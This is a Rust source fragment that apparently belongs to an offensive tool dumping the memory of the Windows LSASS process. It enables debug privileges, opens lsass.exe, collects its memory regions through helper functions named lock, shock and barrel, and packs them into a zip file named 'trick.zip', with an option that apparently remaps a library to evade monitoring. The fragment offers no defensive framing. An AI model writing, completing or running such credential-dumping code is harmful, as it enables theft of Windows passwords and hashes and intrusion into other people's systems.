fn create_memory_zip(memfiles: &[MemFile]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut buffer = Vec::new();
    {
        let mut zip = ZipWriter::new(std::io::Cursor::new(&mut buffer));
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);

        for memfile in memfiles {
            if !memfile.content.is_empty() {
                zip.start_file(&memfile.filename, options)?;
                zip.write_all(&memfile.content)?;
            }
        }
        zip.finish()?;
    }
    Ok(buffer)
}


#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short = 'r', long)]
    remap: bool,

    #[arg(short = 'z', long, default_value = "trick.zip")]
    zip_file: String,
}


unsafe fn trick(zip_file: &str) {
    let _ = enable_debug_privileges();    
    let h_process = match get_process_by_name("c:\\windows\\system32\\lsass.exe") {
        Some(h) => h,
        None => {
            return;
        }
    };

    let lock_json = lock();
    let shock_json =shock(h_process);
    let (barrel_json, memfile_list) = unsafe { barrel(h_process) }.unwrap();

    let _ = generate_zip(
        zip_file,
        &lock_json,
        &shock_json,
        &barrel_json,
        &memfile_list,
    );
}


fn main() {
    let args = Args::parse();
    unsafe {
        if args.remap {
            remap_library();
        }
        trick(&args.zip_file);
    }
}